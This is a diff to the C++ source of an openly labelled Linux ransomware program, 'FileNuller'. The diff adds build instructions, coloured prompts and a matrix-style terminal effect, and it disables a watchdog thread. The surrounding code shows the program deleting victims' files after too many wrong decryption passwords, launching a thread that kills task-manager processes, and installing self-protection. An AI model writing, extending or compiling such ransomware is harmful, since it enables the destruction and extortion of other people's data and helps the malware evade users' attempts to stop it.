@@ -17,11 +17,19 @@
 //
 // To compile this, use g++ with -lcrypto, -lcurl, -std=c++17
 // and -pthread flags
+// For g++ version 8, you need to add -lstdc++fs flag as <filesystem>
+// does not linked by default
+//
+// Lower than version 8 needs to replace filesystem with experimental/filesystem,
+// std::quoted() must be manual quoting, and a few syntax fix.
+//
 // You may use other compiler but make sure that your compiler
 // has one of these options.
-
-
+//
+// g++ viruscurrent.cpp telelimit.cpp -o scramble -lcrypto -lcurl -std=c++17 -pthread -lstdc++fs
 #include <iostream>
+// needed for g++ version 8 compilation
+// #include <iomanip>
 #include <fstream>
 #include <cstring>
 #include <vector>
@@ -225,10 +233,10 @@ void decryptAllFiles() {
             fs::remove(MAP_FILE);
             return;
         }
-        cout << "Incorrect password. Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts - 1) << endl;
+        cout << "\033[1;33m[WARNING]\033[0m Incorrect password. Attempts left: " << (MAX_PASSWORD_ATTEMPTS - attempts - 1) << endl;
         attempts++;
     }
-    cout << "Max password attempts reached. Sorry but we need to delete these files.\n" << endl;
+    cout << "\n\033[1;31m[SORRY]\033[0m Max password attempts reached. Sorry but we need to delete these files.\n" << endl;
     for (auto &pair : fileMap) {
         fs::remove(pair.first);
     }
@@ -330,6 +338,35 @@ void watchdog(const string& selfPath) {
 
 void relaunchInTerminalIfDetached(const char* selfPath) {
     if (!isatty(STDIN_FILENO)) {
+        // Write a temporary matrix effect shell script
+        const char* scriptPath = "/tmp/matrix.sh";
+        ofstream script(scriptPath);
+        script << R"(#!/bin/bash
+clear
+echo -e "\033[1;32m"
+chars=(ｱ ｲ ｳ ｴ ｵ ｶ ｷ ｸ ｹ ｺ ｻ ｼ ｽ ｾ ｿ ﾀ ﾁ ﾂ ﾃ ﾄ ﾅ ﾆ ﾇ ﾈ ﾉ ﾊ ﾋ ﾌ ﾍ ﾎ ﾏ ﾐ ﾑ ﾒ ﾓ ﾔ ﾕ ﾖ ﾗ ﾘ ﾚ ﾛ ﾜ)
+cols=$(tput cols)
+lines=$(tput lines)
+for ((i=0; i<cols; i++)); do
+  pos[i]=0
+done
+while true; do
+  for ((i=0; i<cols; i++)); do
+    if (( RANDOM % 100 < 10 )); then
+      printf "\033[%s;%sH%s" "${pos[i]}" "$i" "${chars[RANDOM % ${#chars[@]}]}"
+    fi
+    (( pos[i]++ ))
+    if (( pos[i] >= lines )); then
+      pos[i]=0
+    fi
+  done
+  sleep 0.05
+done
+)";
+        script.close();
+        chmod(scriptPath, 0755);  // Make the script executable
+
+        // Try launching in available terminals
         const char* terminals[] = {
             "x-terminal-emulator", "xterm", "gnome-terminal",
             "konsole", "xfce4-terminal", "lxterminal",
@@ -337,16 +374,16 @@ void relaunchInTerminalIfDetached(const char* selfPath) {
         };
 
         for (int i = 0; terminals[i]; ++i) {
-            string cmd = string(terminals[i]) + " -e \"" + selfPath + "\" &";
+            string cmd = string(terminals[i]) + " -e \"" + scriptPath + "\" &";
             if (system(cmd.c_str()) == 0) {
-                exit(0);
+                return;  // Terminal launched successfully
             }
         }
 
-        cerr << "[!] Failed to relaunch in terminal!" << endl;
-        exit(1);
+        cerr << "[!] Failed to launch matrix terminal effect!" << endl;
     }
 }
+
 
 // This part will auto install required dependencies if missing.
 // Of course this ransomware will not work if one of them are not
@@ -434,28 +471,16 @@ int main(int argc, char* argv[]) {
 if (!fs::exists(MAP_FILE)) {
     
     string selfPath = fs::absolute(argv[0]);  // Full binary path
-      
+   
     relaunchInTerminalIfDetached(argv[0]);
     setupProtection();
     
     
-    thread wd(watchdog, selfPath);
-    wd.detach();
+    //thread wd(watchdog, selfPath);
+    //wd.detach();
     
     thread antiMonitor(monitorAndKillTaskManagers);
     antiMonitor.detach(); // Keeps it running in background
-
-
-// for the sake of preservation in case there's a problem here
-
-     //   signal(SIGINT, ignoreSignals);  // Prevents Ctrl+C
-      //  signal(SIGTSTP, ignoreSignals); // Prevents Ctrl+Z
-     //   signal(SIGKILL, ignoreSignals); // Prevents other termination signal
-     //   signal(SIGSTOP, ignoreSignals);
-    //    signal(SIGTERM, ignoreSignals);
-       // daemonize();
-        //setupProtection();
-        //watchdog();
 
         cout << " _____ _ _      _   _       _ _\n|  ___(_) | ___| \\ | |_   _| | | ___ _ __ \n| |_  | | |/ _ \\  \\| | | | | | |/ _ \\ '__|\n|  _| | | |  __/ |\\  | |_| | | |  __/ |   \n|_|   |_|_|\\___|_| \\_|\\__,_|_|_|\\___|_|   \nThe not-so-bad RANSOMWARE for Linux by Colton Silva\n" << endl;
 
